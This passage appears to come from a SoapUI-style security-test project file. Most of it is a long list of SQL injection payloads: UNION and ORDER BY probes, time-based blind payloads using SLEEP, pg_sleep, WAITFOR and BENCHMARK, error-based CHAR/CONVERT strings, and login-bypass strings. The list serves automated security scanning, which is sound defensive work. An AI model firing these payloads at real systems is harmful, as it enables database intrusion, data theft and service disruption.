SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>1 or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>/*</con:sqlInjectionStrings><con:sqlInjectionStrings>//</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1'#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1/*</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>'^'</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 14# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=x</con:sqlInjectionStrings><con:sqlInjectionStrings>') or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1083=1083 AND (1427=1427</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=y</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1'--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 28-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND true</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,3,1))='c'</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1"/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--</con:sqlInjectionStrings><con:sqlInjectionStrings>-1' UNION SELECT 1,2,3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>1'</con:sqlInjectionStrings><con:sqlInjectionStrings>or benchmark(50000000,MD5(1))--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000 1/0 */</con:sqlInjectionStrings><con:sqlInjectionStrings>1-false</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--</con:sqlInjectionStrings><con:sqlInjectionStrings>';waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 16-- </con:sqlInjectionStrings><con:sqlInjectionStrings>'));waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or '1'='1'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 3# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)</con:sqlInjectionStrings><con:sqlInjectionStrings>,(select * from (select(sleep(10)))a)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1"#</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>' '</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,2,1))='y'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>' or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>+ SLEEP(10) + '</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 19# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 26-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),"'3</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 5# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23</con:sqlInjectionStrings><con:sqlInjectionStrings>" or "x"="x</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 14-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>" or sleep(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055</con:sqlInjectionStrings><con:sqlInjectionStrings>' or true--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 28 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>/*…*/</con:sqlInjectionStrings><con:sqlInjectionStrings>")) or (("x"))=(("x</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 21# </con:sqlInjectionStrings><con:sqlInjectionStrings>admin" --</con:sqlInjectionStrings><con:sqlInjectionStrings>' UNION SELECT sum(columnname ) from tablename --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>')) or (('x'))=(('x</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 29 </con:sqlInjectionStrings><con:sqlInjectionStrings>'&amp;'</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 7-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 3409=3409 AND ('pytW' LIKE 'pytY</con:sqlInjectionStrings><con:sqlInjectionStrings>and (select substring(@@version,1,1))='X'</con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(50000000,MD5(1))--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 3409=3409 AND ('pytW' LIKE 'pytW</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 7# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT NULL#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--</con:sqlInjectionStrings><con:sqlInjectionStrings>") or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>or benchmark(50000000,MD5(1))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 31337#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>';WAITFOR DELAY '0:0:30'--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=0</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 24-- </con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>||</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),3</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 24 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#</con:sqlInjectionStrings><con:sqlInjectionStrings>pg_SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or ("1"="1</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 25 </con:sqlInjectionStrings><con:sqlInjectionStrings>'*'</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 12-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7506=9091 AND (5913=5913</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings><con:sqlInjectionStrings>'=0--+</con:sqlInjectionStrings><con:sqlInjectionStrings>WHERE 1=1 AND 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 9# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 26 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1'--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or '1'='1</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" #</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 9-- </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1#</con:sqlInjectionStrings><con:sqlInjectionStrings>1 or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 27 </con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>') or sleep(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5--</con:sqlInjectionStrings><con:sqlInjectionStrings>HAVING 1=1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>or pg_SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>admin') or ('1'='1'/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6</con:sqlInjectionStrings></con:config><con:assertion type="Sensitive Information Exposure" id="611b76c9-53f6-4f5c-8efe-e3184c97beed" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" 